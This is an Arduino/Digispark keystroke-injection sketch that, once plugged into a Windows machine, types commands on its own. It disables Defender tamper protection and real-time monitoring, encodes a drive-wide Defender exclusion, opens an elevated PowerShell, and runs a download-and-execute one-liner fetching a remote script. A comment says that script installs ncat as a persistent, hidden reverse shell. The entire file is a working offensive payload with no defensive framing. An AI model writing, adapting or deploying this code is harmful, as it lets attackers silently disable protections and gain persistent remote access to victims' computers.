#include "DigiKeyboard.h"

// powershell
const uint8_t key_arr_1[] PROGMEM = {0,19, 0,18, 0,26, 0,8, 0,21, 0,22, 0,11, 0,8, 0,15, 0,15};
// Add-MpPreference -ExclusionPath “C:”
const uint8_t key_arr_2[] PROGMEM = {2,4, 0,7, 0,7, 0,45, 2,16, 0,19, 2,19, 0,21, 0,8, 0,9, 0,8, 0,21, 0,8, 0,17, 0,6, 0,8, 0,44, 0,45, 2,8, 0,27, 0,6, 0,15, 0,24, 0,22, 0,12, 0,18, 0,17, 2,19, 0,4, 0,23, 0,11, 0,44, 0,0, 2,6, 2,51, 0,0};
// EXIT
const uint8_t key_arr_3[] PROGMEM = {2,8, 2,27, 2,12, 2,23};

void duckyString(const uint8_t* keys, size_t len) {  
    for(size_t i=0; i<len; i+=2) {
        DigiKeyboard.sendKeyStroke(pgm_read_byte_near(keys + i+1), pgm_read_byte_near(keys + i));
    }
}

void setup() {
    pinMode(1, OUTPUT); // Enable LED
    digitalWrite(1, LOW); // Turn LED off
    DigiKeyboard.sendKeyStroke(0); // Tell computer no key is pressed
    

//DISABLE TAMPER PROTECTION
    DigiKeyboard.delay(2000); // DELAY 2000
    DigiKeyboard.sendKeyStroke(41, 1); // CTRL ESC
    DigiKeyboard.delay(750); // DELAY 750
    DigiKeyboard.println("windows security");
    DigiKeyboard.delay(250); // DELAY 250
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(2000); // DELAY 2000
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(2000); // DELAY 2000
    DigiKeyboard.sendKeyStroke(43, 0); // TAB
    DigiKeyboard.delay(100); // DELAY 100
    DigiKeyboard.sendKeyStroke(43, 0); // TAB
    DigiKeyboard.delay(100); // DELAY 100
    DigiKeyboard.sendKeyStroke(43, 0); // TAB
    DigiKeyboard.delay(100); // DELAY 100
    DigiKeyboard.sendKeyStroke(43, 0); // TAB
    DigiKeyboard.delay(100); // DELAY 100
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(1000); // DELAY 1000
    DigiKeyboard.sendKeyStroke(43, 0); // TAB
    DigiKeyboard.delay(100); // DELAY 100
    DigiKeyboard.sendKeyStroke(43, 0); // TAB
    DigiKeyboard.delay(100); // DELAY 100
    DigiKeyboard.sendKeyStroke(43, 0); // TAB
    DigiKeyboard.delay(100); // DELAY 100
    DigiKeyboard.sendKeyStroke(43, 0); // TAB
    DigiKeyboard.delay(100); // DELAY 100
    DigiKeyboard.sendKeyStroke(44, 0); // SPACE
    DigiKeyboard.delay(1000); // DELAY 1000
    DigiKeyboard.sendKeyStroke(28, 4); // ALT y
    DigiKeyboard.delay(1000); // DELAY 1000
    DigiKeyboard.sendKeyStroke(61, 4); // ALT F4

//OPEN POWERSHELL AS ADMIN
    DigiKeyboard.delay(1000); // DELAY 1000
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //start run
    DigiKeyboard.delay(100);
    DigiKeyboard.println("powershell -Command \"Start-Process powershell -Verb RunAs\"");
    DigiKeyboard.delay(100); // DELAY 100
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(500); // DELAY 500
    DigiKeyboard.sendKeyStroke(28, 4); // ALT y
    DigiKeyboard.delay(1000);

// DOWNLOADS POWERSHELL SCRIPT TO: DISABLE DEFENDER MONITORING, DOWNLOAD NCAT, EXPORT NCAT, MOVE NC.EXE TO SYS32, ADD REGISTRY TO RESTART CONNECTION ON RESTARTING PC, AND STARTING CONNECTION WHILE HIDING WINDOWS/PROCESS.
    DigiKeyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true");
    DigiKeyboard.println("IEX(IWR https://raw.githubusercontent.com/bjrumplee/ncatreverseshell/main/install.ps1 -UseBasicParsing)");
    DigiKeyboard.delay(100); // DELAY 100
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER

//END SCRIPT
  DigiKeyboard.delay(100);  
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);

}

void loop() {}
